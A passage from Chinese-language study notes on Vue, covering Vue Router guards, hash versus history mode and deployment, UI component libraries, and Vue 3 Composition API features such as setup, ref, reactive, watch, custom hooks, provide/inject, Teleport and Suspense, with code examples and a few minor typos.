                        //     b: 'hello'
                        // }

                        // props的第二种写法，值为布尔值,若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件
                        // props: true

                        // props的第三种写法，值为函数
                        props($route) {
                            return {
                                id: $route.query.id,
                                title: $route.query.title
                            }
                        }
                    }]
                }
            ]
        }
    ]
})

// 全局后置路由守卫——初始化的时候被调用，每次路由切换之后被调用
router.afterEach((to, from) => {
    document.title = to.meta.title || 'Welcome'
})

export default router
```

##### 组件内路由守卫

> 重要，通过路由规则进入该组件时才会调用这里的两个函数，注意区分beforeRouterLeave和afterEach,它们两个不一样。一个是从新组件离开时调用，一个时进入新组件后调用。
>
> > 注意写在路由组件中如下:About.vue

```vue
<template>
  <div>
    <h2>我是About的内容</h2>
  </div>
</template>

<script>
export default {
  name: "About",
  // 通过路由规则，进入该组件时被调用
  beforeRouteEnter(to, from, next) {
    alert("APP---beforeRouteEnter")
    if (!to.meta.isAuth) {
      //判断是否需要鉴别权限
      if (判断条件) {
        next();
      } else {
        alert("条件不符，无权限查看！");
      }
    } else {
      next();
    }
  },
  // 通过路由规则，离开该组件时被调用
  beforeRouteLeave(to, from, next) {
    alert("APP---beforeRouteLeave")
    next()
  },
};
</script>
```

##### history模式与hash模式+项目打包部署

history和hash的主要区别在于访问路径上的区别，history模式的访问路径简洁易懂，而hash模式的访问路径中有一些不会发送到服务器端的东西，一般就是/#/即其后面的路径，我们的页面路径上会显示这些路径但是这些路径并不会作为访问路径发送到后端服务器上。

那么为什么要设计这个/#/的hash模式呢？

因为当我们项目上线了之后，用户如果通过点击页面上的一些元素进行组件跳转，这样是不会出现什么问题的，但是，如果通过路径进行访问某个组件时，如果此时用的时history模式就会出现错误，因为如果时histroy模式，那么客户端会将整个路径当成请求地址发送个后端服务器，但是很显然前端的路由匹配规则，和后端配置的请求地址时不一样的，后端只需要配置一个路由最开始的那一个路径即可，然后通过前端的路由匹配规则进行页面条状即可。那么如果我们使用的时hash模式，/#/后面的路由匹配规则就不会当作访问路径发送给后端服务器。就不会出现404的问题了。

但是，如果我们就是想用history模式进行项目的上线，也是有解决办法的，但是需要后端进行相应的处理。

这里我们以node后端（java后端也有相应的解决方法）为例：

可以通过第三方库`connect-history`来解决这个问题（node后端第三方库）

**下载地址：**[connect-history-api-fallback - npm (npmjs.com)](https://www.npmjs.com/package/connect-history-api-fallback)

1、在后端使用`npm i connect-history-api-fallback`来安装这个第三方库

2、引入该库，例如：`const history = require('connect-history-api-fallback')`

3、使用该中间件，注意一定要在use使用static静态资源前使用，`app.use(history())`

这样就不会出现上述问题了。

当我们写完了整个项目之后，需要将整个项目进行打包部署，打包时我们可以通过一些打包工具如webpack等进行打包，例如我们可以执行`npm run bulid`来进行项目的打包，当我们执行完这个命令后，我们的项目文件夹中就会出现一个dist文件夹，这个就是我们的项目在经过打包之后生成的文件夹。也是我们需要发送给后端程序员的项目文件夹，在这个文件中，将我们所写的一些用户普通浏览器无法识别的代码变成了，正常的.html .css .js文件。

#### VueUI组件库

##### 移动端常用UI组件库

Vant https://youzan.github.io/vant

Cube UI https://didi.github.io/cube-ui

Mint UI http://mint-ui.github.io

##### PC端常用UI组件库

Element UI https://element.eleme.cn

IView UI https://www.iviewui.com

> 注意：如果按照官网的提示进行完整的引入将会使我们的项目体积变得很大，一般使用“按需引入”，这样可以使我们的项目体积变得小一些。至于“按需引入”怎么使用，则需要查看官方文档的“按需引入”部分。

查阅官网的按需引入介绍：

修改相应的babel.config.js配置文件：例如：

```js
module.exports = {
    presets: [
        '@vue/cli-plugin-babel/preset',
        ["@babel/preset-env", {"modules": false}],
    ],
    plugins:[
        [
            "component",
      		{
        		"libraryName": "element-ui",
        		"styleLibraryName": "theme-chalk"
      		}
        ]
    ]
}
```

> 注意 "presets": [["es2015", { "modules": false }]]运行时可能会报错：Error: Cannot find module 'babel-preset-es2015';这是我们将这样修改即可："presets": [["@babel/preset-env", { "modules": false }]]

接下来到main.js中引入部分组件：以Button和Select组件为例：

```js
import {Button, Select} from 'element-ui';
Vue.component(Button.name, Button);
Vue.component(Select.name, Select);
* 或写为
 * Vue.use(Button)
 * Vue.use(Select)
 */
new Vue({
  el: '#app',
  render: h => h(App)
});
```

> 这里的Button.name其实就是我们在使用时的标签名，我们也可以自定义，将其改为 `'my-button'`,那么在使用的时候我们就需要通过`<my-button></my-button>`来使用。

### Vue3(Vue脚手架)

**优点：**

**性能的提升：**

1、打包大小减少

2、初次渲染和更新渲染更快

3、内存减少

......

**源码的升级：**

1、使用Proxy代替defineProperty实现响应式

2、重写虚拟DOM的实现和Tree-Shaking

......

**可以更好的支持TypeScript**

**新特性：**

1、CompositionAPI(组合API)

​			1、setup配置

​			2、ref与reactive

​			3、watch与watchEffect

​			4、provide与inject

​			5、......

2、新的内置组件

​			1、Fragment

​			2、Teleprot

​			3、Suspense

3、其他改变

​			1、新的生命周期钩子

​			2、data选项应始终被声明为一个函数

​			3、移除keyCode支持作为v-on的修饰符

​			......

#### Vue2和Vue3的响应式对比

Vue2的响应式存在的问题：

​		新增属性、删除属性，界面不会更新。

​		直接通过下标修改数组，界面不会自动更新

Vue3的响应式实现原理：

​		通过Proxy(代理)：拦截对象中任意属性的变化，包括：属性值的读写、属性的添加、属性的删除等。

​		通过Reflect(反射)：对被代理对象的属性进行操作。

#### 创建Vue3.0工程

1、使用vue-cli创建

官方文档：https://cli.vue.js.org/zh/guide/creating-a-project.html#vue-create

```bash
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 安装或者升级你的@vue/cli
npm install -g @vue/cli
## 创建
vue create vue_test
## 启动
cd vue_test
npm run serve
```

2、使用vite创建

官方文档：https://v3.cn.vue.js.org/guide/installation.html#vite

vite官网：https://vitejs.cn

vite——新一代前端构建工具

优势：

1、开发环境中，无需打包操作，可快速的冷启动

2、轻量快速的热重载（HMR）

3、真正的按需编译，不再等待整个应用编译完成

传统构建与vite构建对比图：

![传统构建与vite构建对比图](https://raw.githubusercontent.com/ZhangjunqiGithub/picture/master/vite.jpg)

```bash
## 创建工程
npm init vite-app <project-name>
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```

#### 分析工程结构：

##### main.js

```js
//引入的不再是Vue构造函数了，引入的是一个名为createApp的工厂函数（可以直接调用）
import { createApp } from 'vue'
import App from './App.vue'
//创建应用实例对象——app(类似于之前Vue2中的vm，但app比vm更 轻)并挂载app
createApp(App).mount('#app')
```

##### Vue.js

```vue
<temolate>
    <!-- Vue3组件中的模板结构可以没有根标签 -->
</temolate>
<script>
	export default {
        name: 'App',
        components: {
            
        }
    }
</script>
<style>
</style>
```

> 其他部分没有啥区别

#### setup的使用

```vue
<template>
  <!-- Vue3组件中的模板结构可以没有根标签 -->
  <h1>我是App组件</h1>
  <h1>个人信息</h1>
  <h2>姓名：{{name}}</h2>
  <h2>年龄：{{age}}</h2>
  <button @click="sayHello">hello</button>
</template>

<script>
import {h} from 'vue'
export default {
  name: 'App',
  // 此处只是测试一下setup，暂时不考虑响应式的问题
  setup() {
    // 数据
    let name = '张三'
    let age = 18

    // 方法
    function sayHello() {
      alert(`我叫${name},我${age}岁了，hello!`)
    }

    // 返回一个对象（常用）
    return {
      name,
      age,
      sayHello,
    }

    // 返回一个函数（渲染函数）
    // return () => h('h1','hello')
  }
}
</script>

```

> 这里将数据和方法都配置的到setup中了，注意一定要有return 返回值，结构中才能使用；而且以上写法只用于初始setup的用法，不能实现响应式。

#### ref的使用

> 注意普通数据类型和对象数据类型的区别,普通函数是ref，对象是proxy
>
> > 注意在使用之前要先引入ref

```vue
<template>
  <!-- Vue3组件中的模板结构可以没有根标签 -->
  <h1>我是App组件</h1>
  <h1>个人信息</h1>
  <h2>姓名：{{name}}</h2>
  <h2>年龄：{{age}}</h2>
  <h3>工作种类：{{job.type}}</h3>
  <h3>工作薪水：{{job.salary}}</h3>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import {ref} from 'vue'
export default {
  name: 'App',
  // 此处只是测试一下setup，暂时不考虑响应式的问题
  setup() {
    // 数据
    let name = ref('张三')
    let age = ref(18)
    let job = ref({
      type: '前端工程师',
      salary: '30K'
    })

    // 方法
    function changeInfo() {
      name.value = '李四'
      age.value = 48
      job.value.type = '后端工程师'
      job.value.salary = '40K'
    }

    // 返回一个对象（常用）
    return {
      name,
      age,
      changeInfo,
      job
    }
  }
}
</script>

```

#### reactive函数的使用

> 只能用来定义对象或者数组类型的数据
>
> 在Vue2中，当我们直接修改一个对象中的某个属性或者直接修改数组中的某个元素的时候，Vue是检测不到的，也就无法实时修改页面内容。但是当我们使用reactive处理了这些数据类型之后，我们就可以直接修改一个对象中的某个属性或者直接修改数组中的某个元素了，这样Vue是可以检测到的。

```vue
<template>
  <!-- Vue3组件中的模板结构可以没有根标签 -->
  <h1>我是App组件</h1>
  <h1>个人信息</h1>
  <h2>姓名：{{person.name}}</h2>
  <h2>年龄：{{person.age}}</h2>
  <h3>工作种类：{{person.job.type}}</h3>
  <h3>工作薪水：{{person.job.salary}}</h3>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import {ref,reactive} from 'vue'
export default {
  name: 'App',
  // 此处只是测试一下setup，暂时不考虑响应式的问题
  setup() {
    // 数据
    let person = reactive({
      name: '张三',
      age: 18,
      job: {
        type: '前端工程师',
        salary: '30K',
        a:{
          b:{
            c:666
          }
        }
      },
      hobby:['c++','java','python'],
    })
   let arr = reactive(['数据1','数据2','数据3'])

    // 方法
    function changeInfo() {
      person.name = '李四'
      person.age = 48
      person.job.type = '后端工程师'
      person.job.salary = '40K'
      person.job.a.b.c = 999
      person.hobby[0] = 'Vue3'
    }

    // 返回一个对象（常用）
    return {
     person,
     changeInfo
    }
  }
}
</script>

```

#### reactive对比ref

从定义数据角度对比 :

​			1、ref用来定义：基本类型数据

​			2、reactive用来定义：对象（或数组）类型数据

​			3、备注：ref也可以用来定义对象（或数组）类型数据，它内部会自动通过reactive转为代理对象

从用来角度对比：

​			1、ref通过`Object.defineProperty()`的`get`与`set`来实现响应式（数据劫持）

​			2、reactive通过使用Proxy来实现响应式（数据劫持），并通过Reflect操作源对象内部的数据

从使用角度对比：

​			1、ref定义的数据：操作数据需要`.value`，读取数据时模板直接读取不需要`.value`

​			2、reactive定义的数据：操作数据与读取数据：均不需要`.value`

#### Vue3中的响应式原理

> Reflect.set和Reflect.get来修改和获取相应复杂数据类型中的数据。
>
> > Reflect可以省去很多的try-catch，当遇到问题的时候程序不会崩掉，我们可以通过Reflect的返回值来判断Reflect的相关语句是否执行成功，true/false

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <script type="text/javascript">
        // 源数据
        let person = {
                name: '张三',
                age: 18
            }
            /*Reflect可以省去很多的try-catch，当遇到问题的时候程序不会崩掉，我们可以通过Reflect的返回值来判断Reflect的相关语句是否执行成功，true/false*/

        // 模拟Vue3中实现响应式
        const p = new Proxy(person, {
            // 有人读取p的某个属性时调用
            get(target, propName) {
                console.log(`有人读取了p身上的${propName}属性`)
                return Reflect.get(target, propName)
            },
            // 有人修改p的某个属性、或给p追加某个属性时调用
            set(target, propName, value) {
                console.log(`有人修改了p身上的${propName}属性，我要去更新界面了`)
                Reflect.set(target, propName, value)
            },
            // 有人删除p的某个属性时调用
            deleteProperty(target, propName) {
                console.log(`有人删除了p身上的${propName}属性，我要去更新界面了`)
                return Reflect.deleteProperty(target, propName)
            }
        })
    </script>
</body>

</html>
```

#### setup的两个注意点

setup执行的时机：

​			在beforeCreate之前执行一次，this是undefine

setup的参数：

​			1、props：值为对象，包含：组件外部传递过来，且组件内部声明接受了的属性 

​			2、context：上下文对象

​								1、attrs:值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性，相当于`this.$attrs`

​								2、slots:收到的插槽内容，相当于`this.$slots`

​								3、emit:分发自定义事件的函数，相当于`this.$emit`

> 注意关注下面代码中的setup中的参数props和context,props中的msg和school为父组件传递过来的参数，emits中的hello为父组件传递过来的函数。还有就是插槽，当我们使用了插槽后，在$slots上就可以找到我们使用插槽的一些信息。

**Demo.vue:**

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名：{{person.name}}</h2>
  <h2>年龄：{{person.age}}</h2>
  <button @click="test">测试触发一下Demo组件的Hello事件</button>
</template>

<script>
import {reactive} from 'vue'
export default {
    name: 'Demo',
    props:['msg','school'],
    emits:['hello'],
    setup(props,context) {
        // 数据
        let person = reactive({
            name: '张三',
            age: 18
        })

        // 方法
        function test() {
            context.emit('hello',666)
        }
        // 返回一个对象（常用）
        return {
            person,
            test
        }
    }
}
</script>

<style>

</style>
```

**App.vue:**

```vue
<template>
  <Demo @hello="showHelloMsg" msg="hello" school="xxx大学">
    <template v-slot:qwe>
      <span>xxx大学</span>
    </template>
    <template v-slot:asd>
      <span>xxx大学</span>
    </template>
  </Demo>
</template>

<script>
import Demo from "./components/Demo";
export default {
  name: "App",
  components: { Demo },
  setup() {
    function showHelloMsg(value) {
      alert(`hello,hello事件被触发，收到的参数是：${value}!`);
    }
    return {
      showHelloMsg,
    };
  },
};
</script>

```

#### computed属性的使用

**Demo.vue**

```vue
<template>
  <h1>一个人的信息</h1>
  姓：<input type="text" v-model="person.firstName">
  <br>
  名：<input type="text" v-model="person.lastName">
    <br>
    <span>全名：{{person.fullName}}</span>
    <br>
    全名：<input type="text" v-model="person.fullName">
</template>

<script>
import {reactive,computed} from 'vue'
export default {
    name: 'Demo',
    setup() {
        // 数据
        let person = reactive({
            firstName: '张',
            lastName: '三'
        })
        
        // 计算属性——简写（没有考虑计算属性被修改的情况）
        // person.fullName = computed(() => {
        //     return person.firstName + '-' +person.lastName
        // })

        // 计算属性——简写（考虑读和写）
        person.fullName = computed({
            get() {
            return person.firstName + '-' +person.lastName
            },
            set(value) {
                const nameArr = value.split('-')
                person.firstName = nameArr[0]
                person.lastName = nameArr[1]
            }
        })

        // 返回一个对象（常用）
        return {
            person
        }
    }
}
</script>

<style>

</style>
```

**App.vue**

```vue
<template>
  <Demo/>
</template>

<script>
import Demo from "./components/Demo";
export default {
  name: "App",
  components: { Demo },
};
</script>

```

#### watch函数的使用

**Demo.vue**

```vue
<template>
  <h2>当前求和为：{{sum}}</h2>
  <button @click="sum++">sum++</button>
  <hr>
  <h2>当前的信息为：{{msg}}</h2>
  <button @click="msg+='!'">修改信息</button>
  <hr>
   <h2>姓名：{{person.name}}</h2>
   <h2>年龄：{{person.age}}</h2>
   <h2>薪资：{{person.job.j1.salary}}K</h2>
   <button @click="person.name+='~'">修改姓名</button> 
   <button @click="person.age++">增长年龄</button> 
    <button @click="person.job.j1.salary++">涨薪</button>
</template>

<script>
// ref在模板字符串中不用加.value,但是在script代码中需要加上.value,而reactive不需要加.value
// 注意：强制开启了深度监视（deep配置无效）
import {ref, reactive, watch} from 'vue'
export default {
    name: 'Demo',
    setup() {
        // 数据
        let sum = ref(0)
        let msg = ref('hello')
        let person = reactive({
            name: '张三',
            age: 18,
            job: {
                j1: {
                    salary: 28
                }
            }
        })

        // 注意：ref中的对象数据还是会调用reactive来处理

        // 情况一：监视ref所定义的一个响应式数据
        // watch(sum,(newValue,oldValue) => {
        //     console.log('sum变了',newValue,oldValue)
        // },{immediate:true})

        // 情况二：监视ref所定义的多个响应式数据
        // watch([sum,msg],(newValue,oldValue) => {
        //     console.log('sum或msg变了',newValue,oldValue)
        // },{immediate:true})

        // 情况三：监视reactive所定义的一个响应式数据的全部属性：注意：此处无法正确的获取oldValue
        // watch(person,(newValue) => {
        //     console.log('person变化了',newValue);
        // })

        // 注意：当监视的是一个对象中的某个属性的时候是有oldValue值的

        // 情况四：监视reactive所定义的一个响应式数据中的某个属性
        // watch(() => person.name,(newValue,oldValue) => {
        //     console.log('person的name变化了',newValue,oldValue);
        // })

        // 情况四：监视reactive所定义的一个响应式数据中的某些属性
        // watch([() => person.name,() => person.age],(newValue,oldValue) => {
        //     console.log('person的name或age变化了',newValue,oldValue);
        // })

        // 特殊情况：
        watch(() => person.age,(newValue,oldValue) => {
            console.log('person的job变化了',newValue,oldValue);
        },{deep: true})//此处由于监视的是reactive定义的对象中的某个属性，所以deep配置有效

        // 返回一个对象（常用）
        return {
            sum,
            msg,
            person
        }
    }
}
</script>

<style>

</style>
```

**App.vue**

```vue
<template>
  <Demo/>
</template>

<script>
import Demo from "./components/Demo";
export default {
  name: "App",
  components: { Demo },
};
</script>

```

#### watchEffect函数

**Demo.vue**

```vue
<template>
  <h2>当前求和为：{{sum}}</h2>
  <button @click="sum++">sum++</button>
  <hr>
  <h2>当前的信息为：{{msg}}</h2>
  <button @click="msg+='!'">修改信息</button>
  <hr>
   <h2>姓名：{{person.name}}</h2>
   <h2>年龄：{{person.age}}</h2>
   <h2>薪资：{{person.job.j1.salary}}K</h2>
   <button @click="person.name+='~'">修改姓名</button> 
   <button @click="person.age++">增长年龄</button> 
    <button @click="person.job.j1.salary++">涨薪</button>
</template>

<script>
// ref在模板字符串中不用加.value,但是在script代码中需要加上.value,而reactive不需要加.value
// 注意：强制开启了深度监视（deep配置无效）
import {ref, reactive, watch, watchEffect} from 'vue'
export default {
    name: 'Demo',
    setup() {
        // 数据
        let sum = ref(0)
        let msg = ref('hello')
        let person = reactive({
            name: '张三',
            age: 18,
            job: {
                j1: {
                    salary: 28
                }
            }
        })

        // 监视
        // watch(sum,(newValue,oldValue) => {
        //     console.log('sum的值变化了', newValue,oldValue)
        // },{immediate: true})

        // 回调中所用到的数据发生改变时，就会执行watchEffect函数
        watchEffect(() => {
            const x1 = sum.value
            const x2 = person.job.j1.salary
            console.log('watchEffect所指定的回调执行')
        })

        // 返回一个对象（常用）
        return {
            sum,
            msg,
            person
        }
    }
}
</script>

<style>

</style>
```

**App.vue**

```vue
<template>
  <Demo/>
</template>

<script>
import Demo from "./components/Demo";
export default {
  name: "App",
  components: { Demo },
};
</script>

```

#### 生命周期函数

**Demo.vue**

```vue
<template>
  <h2>当前求和为：{{sum}}</h2>
  <button @click="sum++">sum++</button>
</template>

<script>
// ref在模板字符串中不用加.value,但是在script代码中需要加上.value,而reactive不需要加.value
// 注意：强制开启了深度监视（deep配置无效）
import {ref,onBeforeMount,onMounted,onBeforeUpdate,onUpdated,onBeforeUnmount,onUnmounted} from 'vue'
export default {
    name: 'Demo',
    setup() {
        // 数据
        console.log('---setup---');
        let sum = ref(0)
        // 通过组合式API的形式去使用生命周期钩子
        onBeforeMount(() => {
            console.log('---onBeforeMount---');
        })
        onMounted(() => {
            console.log('---onMounted---');
        })
        onBeforeUpdate(() => {
            console.log('---onBeforeUpdate---');
        })
        onUpdated(() => {
            console.log('---onUpdated---');
        })
        onBeforeUnmount(() => {
            console.log('---onBeforeUnmount---');
        })
        onUnmounted(() => {
            console.log('---onUnmounted---');
        })
        // 返回一个对象（常用）
        return {sum}
    },
    // 通过配置项的形式使用生命周期钩子
    //#region 
   /* beforeCreate() {
        console.log('---beforeCreate---');
    },
    created() {
        console.log('---created---');
    },
    beforeMount() {
        console.log('---beforeMount---');
    },
    mounted() {
        console.log('---mounted---');
    },
    beforeUpdate() {
        console.log('---beforeUpdate---');
    },
    updated() {
        console.log('---updated---');
    },
    beforeUnmount() {
        console.log('---beforeUnmount---');
    },
    unmounted() {
        console.log('---unmounted---');
    }*/
    //#endregion 
}
</script>

<style>

</style>
```

**App.vue**

```vue
<template>
<button @click="isShowDemo = !isShowDemo">切换隐藏/显示</button>
  <Demo v-if="isShowDemo"/>
</template>

<script>
import {ref} from 'vue'
import Demo from "./components/Demo";
export default {
  name: "App",
  components: { Demo },
  setup() {
    let isShowDemo = ref(true)
    return {isShowDemo}
  }
};
</script>

```

#### 自定义hook函数

> hook函数，把setup函数中使用的Composition API进行了封装。
>
> 类似于vue2.x中的mixin
>
> 自定义hook的优势：复用代码，让setup中的逻辑更清除易懂

也就是说将部分功能代码抽离出来供多个组件使用。

1、需要在src/创建一个hooks文件夹，在其中将索要抽离出来的代码封装程一个个js文件，这些js文件一般以usexxx.js命名。

src/hooks/usePoint.js

```js
import { reactive, ref, onMounted, onBeforeUnmount } from 'vue'
export default function savePoint() {
    // 实现鼠标打点相关的数据
    let point = reactive({
        x: 0,
        y: 0
    })

    // 实现鼠标打点相关的方法
    function savePoint(event) {
        point.x = event.pageX
        point.y = event.pageY
        console.log(event.pageX, event.pageY);
    }

    // 实现鼠标打点相关的生命周期钩子
    onMounted(() => {
        window.addEventListener('click', savePoint)
    })

    onBeforeUnmount(() => {
        window.removeEventListener('click', savePoint)
    })

    return point
}
```

> 注意这里的`return point`

Demo.vue组件中使用这个功能：

```vue
<template>
  <h2>当前求和为：{{sum}}</h2>
  <button @click="sum++">sum++</button>
  <hr>
  <h2>当前点击时鼠标的坐标为：x：{{point.x}}y：{{point.y}}</h2>
</template>

<script>
import {ref} from 'vue'
import usePoint from '../hooks/usePoint'
export default {
    name: 'Demo',
    setup() {
        // 数据
        let sum = ref(0)
        //这里就体现出上面的那个return point注意点了
        let point = usePoint()
        // 返回一个对象（常用）
        return {sum, point}
    }
}
</script>

<style>

</style>
```

#### toRef+toRefs

**Demo.vue**

```vue
<template>
   <h2>姓名：{{name}}</h2>
   <h2>年龄：{{age}}</h2>
   <h2>薪资：{{job.j1.salary}}K</h2>
   <button @click="name+='~'">修改姓名</button> 
   <button @click="age++">增长年龄</button> 
   <button @click="job.j1.salary++">涨薪</button>
</template>

<script>
import { reactive, toRef, toRefs} from 'vue'
export default {
    name: 'Demo',
    setup() {
        // 数据
        let person = reactive({
            name: '张三',
            age: 18,
            job: {
                j1: {
                    salary: 28
                }
            }
        })

        // const name1 = person.name
        // console.log('%%%',name1);

        // const name2 = toRef(person, 'name')
        // console.log('####', name2)

        // const x = toRefs(person)
        // console.log('*****', x);

        // 返回一个对象（常用）
        return {
            // name:toRef(person,'name'),
            // age:toRef(person, 'age'),
            // salary:toRef(person.job.j1, 'salary')
            person,
            //只能处理第一层对象
            ...toRefs(person)
        }
    }
}
</script>

<style>

</style>
```

#### shallowReactive+shallowRef

**使用场景：**

> 如果有一个对象数据，结构比较深，但改变时只是最外层属性改变 ===>shallowReactive
>
> 如果有一个对象数据，后续功能不会修改该对象中的属性，而是用新的对象来替换===>shallowRef

**Demo.vue**

```vue
<template>
   <h2>姓名：{{name}}</h2>
   <h2>年龄：{{age}}</h2>
   <h2>薪资：{{job.j1.salary}}K</h2>
   <button @click="name+='~'">修改姓名</button> 
   <button @click="age++">增长年龄</button> 
   <button @click="job.j1.salary++">涨薪</button>
</template>
<script>
// shallowRef:只处理基本数据类型的响应式，不进行对象的响应式处理
import { reactive, toRef, toRefs, shallowReactive, shallowRef} from 'vue'
export default {
    name: 'Demo',
    setup() {
        // 只能处理第一层的数据，对象中深层的数据是无法处理的
        let person = shallowReactive({
            name: '张三',
            age: 18,
            job: {
                j1: {
                    salary: 28
                }
            }
        })

        // 返回一个对象（常用）
        return {
            person,
            ...toRefs(person)
        }
    }
}
</script>

<style>

</style>
```

#### readonly+shallowReadonly的使用

> 使用场景：如果我们想让一些数据只读，那么我们就需要用到这两个API了，shallowReadonly只能控制深层数据中的第一层。
>
> > 如果在别人的代码的基础上编写代码，且别人不想让我们更改某些数据的时候，我们就可以先把这些数据定义为readonly或shallowReadonly(根据数据的具体情况处理)，这样这些数据就是只读的了，当我们修改时，会有警告且修改不了

**使用方法：**

```vue
<script>
/*先引入*/
import {readonly, shallowReadonly}
export default {
	name: 'Demo',
	setup() {
		let sum = ref(0)
		let person = {
			name: 'xxx',
			age: 20,
			job: {
				job1: {
					name: 'xxx'	
				}
			}
		}
	}
	person = readonly(person)
	sum = shallowReadonly(sum)
}
</script>
```

#### toRaw+markRaw

**toRaw:**

> 作用：将一个由reactive生成的**响应式对象**转为**普通对象**
>
> 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新

`let p = toRaw(person)`

**markRaw:**

> 作用：标记一个对象，使其永远不会再成为响应式对象
>
> 使用场景：
>
> ​		1、有些值不应被设置为响应式的，例如复杂的第三方类库等
>
> ​		2、当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能

`let p = markRaw(person)`

#### customRef

> 作用：创建一个定义的ref,并对其依赖项跟踪和更新触发进行显式控制

**App.vue**

```vue
<template>
  <input type="text" v-model="keyWord" />
  <h3>{{ keyWord }}</h3>
</template>

<script>
import { customRef, ref } from "vue";
export default {
  name: "App",
  setup() {
    // 使用vue提供的ref
    // let keyWord = ref("hello")

    // 自定义一个ref
    function myRef(value, delay) {
      let timer
      return customRef((track, trigger) => {
        return {
          get() {
            console.log(`有人从myRef这个容器中读取数据了，我把$(value)给他了`);
            track(); //通知Vue追踪value的变化,如果不追踪，页面将不会更改
            return value;
          },
          set(newValue) {
            console.log(`有人把myRef这个容器中数据改为了：$(newValue)`);
            clearTimeout(timer)//实现函数防抖功能
            timer = setTimeout(() => {
              value = newValue;
              trigger(); //通知Vue去重新解析模板
            }, delay);
          },
        };
      });
    }

    // 使用程序员自定义的ref
    let keyWord = myRef("hello",500);
    return { keyWord };
  },
};
</script>

```

#### provide+inject

> 作用：实现**祖孙组件间**通信
>
> 使用方法：父组件有一个`provide`选项来提供数据，子组件有一个`inject`选项来开始使用这些数据

**具体写法：**

**父组件（App.vue）：**

```vue
<template>
  <div class="app">
    <h3>我是App组件（祖）,{{name}}---{{price}}</h3>
    <Child/>
  </div>
</template>

<script>
import {reactive,toRefs,provide} from 'vue'
import Child from './components/Child.vue'

export default {
  name: 'APP',
  components: { Child },
  setup() {
    let car = reactive({
      name: '奔驰',
      price: '40W'
    })
    provide('car',car)//给自己的后代组件传递数据
    return {...toRefs(car)}
  }
}
</script>

<style>
  .app {
    background-color: gray;
    padding: 10px;
  }
</style>
```

**子组件(Child.vue)：**

> 父子组件间通信一般用props

```vue
<template>
  <div class="child">
    <h3>我是Child组件（子）</h3>
    <Son/>
  </div>
</template>

<script>
import Son from './Son.vue'
export default {
  name: 'Child',
  components:{Son}
}
</script>

<style>
  .child {
    background-color: skyblue;
    padding: 10px;
  }
</style>
```

**孙组件(Son.vue)：**

```vue
<template>
  <div class="son">
    <h3>我是Son组件（孙）,{{car.name}}---{{car.price}}</h3>
  </div>
</template>

<script>
import {inject} from 'vue'
export default {
  name: 'Son',
  setup() {
    //   注入数据
      let car = inject('car')
      return {car}
  }
}
</script>

<style>
  .son {
    background-color: orange;
    padding: 10px;
  }
</style>
```

#### 响应式数据的判断

| isRef      | 检查一个值是否为一个ref对象                            |
| ---------- | ------------------------------------------------------ |
| isReactive | 检查一个对象是否是由reactive创建的响应式代理           |
| isReadonly | 检查一个对象是否是由readonly创建的只读代理             |
| isProxy    | 检查一个对象是否是由reactive或者readonly方法创建的代理 |

#### 组合式API的优势

> 可以将相关功能的代码整合到一起，要使用hooks才能体现这一点

**Options API存在的问题：**

使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data、methods、computed里修改

**Composition API的优势：**

我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有许多组织在一起

#### 新的组件

##### Fragment

在Vue2中：组件必须有一个根标签

在Vue3中：组件可以没有根标签，内部会将多个标签包含在一个Fragment虚拟元素中

好处：减少标签层级，减小内存占用

##### Teleport

> Teleport是一种能够将我们的组件html结构移动到指定位置的技术

```vue
<template>
  <div>
    <button @click="isShow = true">弹窗</button>
    <teleport to="body">
      <div v-if="isShow" class="mask">
        <div class="dialog">
          <h3>我是一个弹窗</h3>
          <h4>内容</h4>
          <h4>内容</h4>
          <h4>内容</h4>
          <button @click="isShow = false">关闭弹窗</button>
        </div>
      </div>
    </teleport>
  </div>
</template>

<script>
import { ref } from "vue";
export default {
  name: "Dialog",
  setup() {
    let isShow = ref(false);
    return { isShow };
  },
};
</script>

<style>
.dialog {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%,-50%);
  text-align: center;
  width: 300px;
  height: 300px;
  background-color: green;
}
.mask {
  position: absolute;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;
  background-color: rgba(0, 0, 0, 0.5);
}
</style>
```

> 如上代码就实现了，当我点击弹窗的时候，Teleport中的代码就会被加到body中

##### Suspense

> 与异步组件配合使用，当使用了异步引入的时候就可能出现后面的组件等待着前面的组件加载出来了之后才会加载此组件，这时我们可以用suspense，当在加载某个组件的时候先在页面中展示一个默认的组件内容，当组件加载完毕后，在展示出这个组件。

```vue
<template>
  <div class="app">
    <h3>我是App组件</h3>
    <Suspense>
 		<!-- 这里的 v-slot:default和v-slot:fallback不能变-->
      <template v-slot:default>
       <Child/>
      </template>
      <template v-slot:fallback>
       <h3>稍等，加载中</h3>
      </template>
    </Suspense>
  </div>
</template>

<script>
// import Child from './components/Child.vue'//静态引入
import {defineAsyncComponent} from 'vue'
const Child = defineAsyncComponent(() => import('./components/Child'))//异步引入
export default {
  name: 'APP',
  components: { Child },
}
</script>

<style>
  .app {
    background-color: gray;
    padding: 10px;
  }
</style>
```

#### Vue3中API的调整

**将全局的API，即：`Vue.xxx`调整到应用实例`app`上**

| vue.2.x全局API（Vue）    | Vue3.x实例API（app）        |
| ------------------------ | --------------------------- |
| Vue.config.xxx           | app.config.xxx              |
| Vue.config.productionTip | 移除                        |
| Vue.component            | app.component               |
| Vue.directive            | app.directive               |
| Vue.mixin                | app.mixin                   |
| Vue.use                  | app.use                     |
| Vue.prototype            | app.config.globalProperties |

**其他改变**

**1、data选项应始终被声明为一个函数**

**2、过度类名的更改：**

Vue2.x写法：

```vue
.v-enter,
.v-leave-to {
	opacity: 0;
}
.v-leave,
.v-enter-to {
	opacity: 1;
}
```

Vue3.x写法：

```vue
.v-enter-from,
.v-leave-to {
